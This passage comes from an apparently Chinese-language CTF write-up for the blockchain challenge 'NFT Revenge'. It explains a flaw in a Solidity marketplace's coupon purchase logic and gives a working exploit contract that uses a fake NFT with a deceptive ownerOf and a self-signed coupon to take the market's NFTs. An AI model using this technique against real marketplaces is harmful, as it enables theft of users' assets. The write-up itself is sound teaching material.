</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>22.924</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>ReadOnlyCallFunction</span><span class=p>:</span><span class=mi>535</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>ReadOnlyCallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>balances</span><span class=p>(</span><span class=s1>&#39;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#39;</span><span class=p>,)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Result</span><span class=p>]</span><span class=mi>128</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>23.152</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>CallFunction</span><span class=p>:</span><span class=mi>501</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>CallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>getFlag</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>23.448</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>328</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0xc174fa072a9cd7464c2f1c79843621e8cfcf00f622f30bd4204dd653f30a3eba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Txn</span><span class=p>]{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;chainId&#34;</span><span class=p>:</span> <span class=mi>8888</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;to&#34;</span><span class=p>:</span> <span class=s2>&#34;0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;nonce&#34;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=s2>&#34;1.2 Gwei&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gas&#34;</span><span class=p>:</span> <span class=mi>25193</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0xf9633930&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>00</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mf>28.650</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>336</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>][</span><span class=n>Success</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0xc174fa072a9cd7464c2f1c79843621e8cfcf00f622f30bd4204dd653f30a3eba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockNumber</span><span class=p>]</span><span class=mi>92325</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>From</span><span class=p>]</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>To</span><span class=p>]</span><span class=mh>0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Value</span><span class=p>]</span><span class=mi>0</span> <span class=p>[</span><span class=n>GasUsed</span><span class=p>]</span><span class=mi>25193</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Data</span><span class=p>]</span><span class=mh>0xf9633930</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Logs</span><span class=p>][</span><span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xF332E425FC7e63B1cf0D2041505d4E6AcDE38d02&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000002f7ccf235768b35e0ba171d7fa60690ef35e79ba&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>92325</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xc174fa072a9cd7464c2f1c79843621e8cfcf00f622f30bd4204dd653f30a3eba&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x66036d09fbd50b766a6f03aae7cda0ac5f8f3c4d9b7fef1f7b02d138a127b28d&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>})]</span>
</span></span></code></pre></td></tr></table></div></div><p>最后进入<code>Option 3</code>，获取<code>flag</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/13.png alt=13></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{Make_Two_Equel_Successfully}
</span></span></code></pre></td></tr></table></div></div><h2 id=nft-revenge>NFT Revenge</h2><h3 id=题目描述-1>题目描述</h3><p><img src=https://img.seaeye.cn/img/qwnt2022/14.png alt=14></p><p><img src=https://img.seaeye.cn/img/qwnt2022/15.png alt=15></p><p><a href=https://img.seaeye.cn/file/qwnt2022/NFT%20Revenge.sol>合约文件(自行微调版)</a></p><h3 id=解题过程-1>解题过程</h3><p>首先使用<code>nc 140.210.217.225 10001</code>连接服务器看看情况，发现需要先进行<code>工作量证明</code>，使用<code>Poseidon.PoW</code>模块即可，直接给出以下脚本<code>pow.py</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/16.png alt=16></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Poseidon.PoW</span> <span class=kn>import</span> <span class=n>PoWUtils</span>   <span class=c1># https://github.com/B1ue1nWh1te/Poseidon</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Connection</span> <span class=o>=</span> <span class=n>PoWUtils</span><span class=o>.</span><span class=n>ProofOfWork_SHA256_EndWithZero</span><span class=p>(</span><span class=s2>&#34;140.210.217.225&#34;</span><span class=p>,</span> <span class=mi>10001</span><span class=p>,</span> <span class=s2>&#34;sha256(&#34;</span><span class=p>,</span> <span class=s2>&#34;+?)&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>20</span><span class=p>,</span> <span class=s2>&#34;?=&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>执行<code>python3 pow.py</code>，成功进入题目环境。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/17.png alt=17></p><p>进入<code>Option 4</code>，获取<code>合约源代码</code>（已附在题目描述中）。</p><p>进入<code>Option 1</code>，创建<code>Deployer</code>账户。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/18.png alt=18></p><p>访问<code>http://140.210.217.225:8080/</code>，为该账户领取测试币以发起交易。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/19.png alt=19></p><p>进入<code>Option 2</code>，部署题目合约，记录下<code>合约地址</code>以备后续使用。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/20.png alt=20></p><p>下面开始对合约进行分析，通过上面题目描述中已经附上的代码可以看出，这一题和<code>0CTF 2022</code>的<code>NFT Market</code>那题非常相似，但是<code>Solidity</code>版本由原先包含<code>Calldata 元组 ABI 重新编码中的头部溢出错误</code>的<code>0.8.15</code>版本变为了修复该 BUG 后的<code>0.8.16</code>版本，因此之前的解题方法就不太适用于这一题。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/21.png alt=21></p><p>于是大致对比一下两道题目的合约代码，发现只有<code>purchaseWithCoupon</code>函数是有比较大的变动的，因此我们需要以新的思路进行构造，以获取<code>#3</code>NFT。</p><p><code>NFT Market</code>原版：</p><p><img src=https://img.seaeye.cn/img/qwnt2022/22.png alt=22></p><p><code>NFT Revenge</code>修改版：</p><p><img src=https://img.seaeye.cn/img/qwnt2022/23.png alt=23></p><p>接下来还是从头开始分析，先看<code>NFT</code>合约，很正常没有什么疑点。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/24.png alt=24></p><p>再看<code>Token</code>合约，有用的信息是：<code>Market</code>合约的代币余额为<code>1337</code>、我们可以调用一次<code>airdrop</code>函数以获得数量为<code>5</code>的代币。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/25.png alt=25></p><p>之后看到<code>Market</code>合约的构造函数，所有相关合约都由其创建，并且一共<code>mint</code>了<code>3</code>个NFT，分别以<code>1</code>、<code>1337</code>、<code>13333333337</code>的价格依次上架了这三个NFT。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/26.png alt=26></p><p>然后看待<code>Market</code>合约的<code>win</code>函数，它指示了我们需要获取到这三个NFT才能达到解出条件，那么接下来就是思考如何<code>空手套白狼</code>以获取这三个已经上架到<code>Market</code>的NFT了。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/27.png alt=27></p><p>首先不难判断出我们可以直接<code>领取空投</code>代币去买下<code>#1</code>NFT，我们必须这么做因为后续的各种操作都离不开<code>#1</code>NFT为我们打开格局，在初始状态下，<code>Market</code>的<code>orders</code>的内容可以抽象为<code>[#1,#2,#3]</code>。</p><p>为了方便讲解在此处放出<code>Hacker.sol</code>攻击合约的部分代码以进行形式化说明，我们的操作全称由<code>攻击合约</code>代为完成，首先调用<code>Token.airdrop()</code>获取启动资金，然后调用<code>Market.purchaseOrder(0)</code>表示全款买下<code>#1</code>NFT，最后别忘了用<code>NFT.approve(address(Market), 1)</code>授权<code>Market</code>可以移动<code>现在属于我们</code>的<code>#1</code>NFT，以便后续的上架操作能够正常完成。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/28.png alt=28></p><p>执行<code>Hack1</code>后，<code>Market</code>的<code>orders</code>为<code>[#3,#2]</code>，这由<code>Market</code>的<code>_deleteOrder</code>处理。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/29.png alt=29></p><p>之后要拿下的是<code>#3</code>NFT，顺序不能弄错，这是特地构造出来的。下面还是以<code>攻击合约</code>的代码来说明，先看<code>红框部分</code>，趁着我们还拥有对<code>#1</code>的控制权，先插入一个<code>Order</code>以便我们之后能将<code>#1</code>NFT买回。之后上架一个我们自己创建的<code>假的NFT</code>，并且它的<code>tokenId</code>为<code>3</code>，为什么是<code>3</code>呢，由于代码间跨度较大，我们后续再分析。再然后再上架一次<code>#1</code>NFT，这次的作用就是为了进行攻击<code>#3</code>NFT的。这三行之后<code>Market</code>的<code>orders</code>为<code>[#3,#2,#1,#Fake3,#1]</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/30.png alt=30></p><p>接下来开始切回<code>Market</code>合约进行分析，首先<code>#3</code>NFT的价格为<code>13333333337</code>，我们没有足够的代币直接买下，也没有漏洞可供我们获得如此大量的代币，所以只能另寻思路。看到<code>purchaseWithCoupon</code>函数，并重点关注<code>红框部分</code>代码，可以发现它重新通过<code>getOrder</code>来获取了新的<code>Order</code>对象（因为在上面调用了一次<code>_deleteOrder</code>删掉了旧的<code>Order</code>），但是发送的<code>tokenId</code>还是用的之前临时存储的旧的<code>order</code>对象。</p><p>因此也解释了我们上面为何那样构造订单顺序，首先通过上架<code>假的</code>且<code>tokenId</code>为<code>3</code>的NFT，以通过前面的重重验证，并且在这个漏洞点发挥重要作用，新的<code>Order</code>是我们最后插入的<code>#1</code>NFT，而它的<code>nftAddress</code>是我们所期望的与解题相关的NFT合约地址，这样一来，可以让<code>Market</code>合约把<code>#3</code>NFT发给我们，但还有一步就是需要构造<code>owner</code>，以使其值变成<code>Market</code>合约的地址（因为它是<code>#3</code>NFT的拥有者），如果不构造的话<code>owner</code>就会变成我们的地址，这样转移<code>#3</code>NFT就会失败。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/31.png alt=31></p><p>下面看到我们自己的<code>HackerNFT</code>合约，构造<code>ownerOf</code>以使其在<code>Verifier</code>调用的时候显示<code>owner</code>是我们自己以便通过签名验证，在<code>Market</code>调用的时候显示<code>owner</code>是<code>Market</code>以便转移<code>#3</code>NFT能够成功。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/32.png alt=32></p><p>最后就是解决签名验证问题了，看到题目的<code>CouponVerifierBeta</code>合约，我们需要构造<code>SignedCoupon</code>对象，并且其中的<code>coupon.issuer</code>需要为我们通过私钥控制的能够对消息进行签名的账户的地址，这也就是为什么在<code>Verifier</code>调用<code>orderOf</code>时返回<code>Me</code>的原因。然后<code>coupon.user</code>就是<code>攻击合约</code>地址，最后是<code>SignedCoupon</code>对象的整体构造。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/33.png alt=33></p><p>看到<code>攻击合约</code>的<code>GetMessageHashToSign</code>函数，这里构造了和上面分析一致的<code>FakerOrder</code>，以上架<code>#Fake3</code>NFT，然后构造<code>FakeCoupon</code>，指示我们这个<code>Coupon</code>是用来购买<code>Market.orders[3]</code>这个<code>#Fake3</code>NFT的，最后就是按照前面<code>CouponVerifierBeta</code>给出的消息格式进行编码并获取<code>keccak256</code>值，以便我们对消息哈希进行链下签名，获得<code>v</code>、<code>r</code>、<code>s</code>的值。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/34.png alt=34></p><p>需要注意的是签名需要以<code>EIP-712</code>标准进行，然后将签名数据传给<code>Hack3</code>以进行构造<code>SignedCoupon</code>，之后<code>Market.purchaseWithCoupon(FakeSignedCoupon)</code>就可以跑通了，成功拿下<code>#3</code>NFT，在此之后<code>Market</code>的<code>orders</code>为<code>[#3,#2,#1]</code>。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/35.png alt=35></p><p><img src=https://img.seaeye.cn/img/qwnt2022/36.png alt=36></p><p>最后我们把<code>#2</code>NFT拿下并且利用之前的布局将<code>#1</code>买回，看到<code>Market</code>的<code>purchaseTest</code>，它允许我们用<code>Market</code>的代币以指定价格来购买一个NFT，并且这个付款是给这个指定NFT的原<code>owner</code>的。前面我们提到<code>Market</code>合约的代币余额为<code>1337</code>，而且<code>#2</code>NFT的价格也为<code>1337</code>，那么我们直接让其以<code>1337</code>的价格购买我们前面拿下的<code>#1</code>NFT，这样就有钱买<code>#2</code>NFT了，并且我们还剩有一些代币以买回<code>#1</code>NFT。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/37.png alt=37></p><p>根据上述分析，得到<code>Hack2</code>，第一次<code>Market.purchaseOrder(1)</code>后，<code>Market</code>的<code>orders</code>为<code>[#3,#1]</code>，所以再执行一次<code>Market.purchaseOrder(1)</code>买回<code>#1</code>NFT，至此我们已经拿到了全部NFT，调用<code>Market.win()</code>即可触发<code>SendFlag</code>事件。</p><p><img src=https://img.seaeye.cn/img/qwnt2022/38.png alt=38></p><p>下面给出完整的<code>Hacker.sol</code>攻击合约代码（这里的<code>target.sol</code>就是题目合约文件 上面分析已经很详细了 就不给注释了）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>16</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;./target.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Hacker</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CtfMarket</span> <span class=n>Market</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>CtfNFT</span> <span class=n>NFT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>CtfToken</span> <span class=n>Token</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>CouponVerifierBeta</span> <span class=n>Verifier</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>HackerNFT</span> <span class=n>FakeNFT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=n>Me</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_marketAddress</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span> <span class=o>=</span> <span class=n>CtfMarket</span><span class=p>(</span><span class=n>_marketAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>NFT</span> <span class=o>=</span> <span class=n>CtfNFT</span><span class=p>(</span><span class=n>Market</span><span class=p>.</span><span class=n>ctfNFT</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>NFT</span><span class=p>.</span><span class=n>setApprovalForAll</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>Market</span><span class=p>),</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Token</span> <span class=o>=</span> <span class=n>CtfToken</span><span class=p>(</span><span class=n>Market</span><span class=p>.</span><span class=n>ctfToken</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>Token</span><span class=p>.</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>Market</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Verifier</span> <span class=o>=</span> <span class=n>CouponVerifierBeta</span><span class=p>(</span><span class=n>Market</span><span class=p>.</span><span class=n>verifier</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>FakeNFT</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HackerNFT</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>Market</span><span class=p>),</span> <span class=kt>address</span><span class=p>(</span><span class=n>Verifier</span><span class=p>),</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>FakeNFT</span><span class=p>.</span><span class=n>mint</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>FakeNFT</span><span class=p>.</span><span class=n>mint</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>FakeNFT</span><span class=p>.</span><span class=n>mint</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>FakeNFT</span><span class=p>.</span><span class=n>setApprovalForAll</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Me</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>Hack1</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Token</span><span class=p>.</span><span class=n>airdrop</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>Market</span><span class=p>.</span><span class=n>purchaseOrder</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>NFT</span><span class=p>.</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>Market</span><span class=p>),</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>GetMessageHashToSign</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes32</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Order</span> <span class=k>memory</span> <span class=n>FakeOrder</span> <span class=o>=</span> <span class=n>Order</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>FakeNFT</span><span class=p>),</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Coupon</span> <span class=k>memory</span> <span class=n>FakeCoupon</span> <span class=o>=</span> <span class=n>Coupon</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>Me</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;want to get flag&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>bytes32</span> <span class=n>MessageHash</span> <span class=o>=</span> <span class=nb>keccak256</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=nb>abi</span><span class=p>.</span><span class=nb>encode</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;I, the issuer&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>FakeCoupon</span><span class=p>.</span><span class=n>issuer</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;offer a special discount for&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>FakeCoupon</span><span class=p>.</span><span class=n>user</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;to buy&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>FakeOrder</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;at&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>FakeCoupon</span><span class=p>.</span><span class=n>newprice</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;because&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>FakeCoupon</span><span class=p>.</span><span class=n>reason</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>MessageHash</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
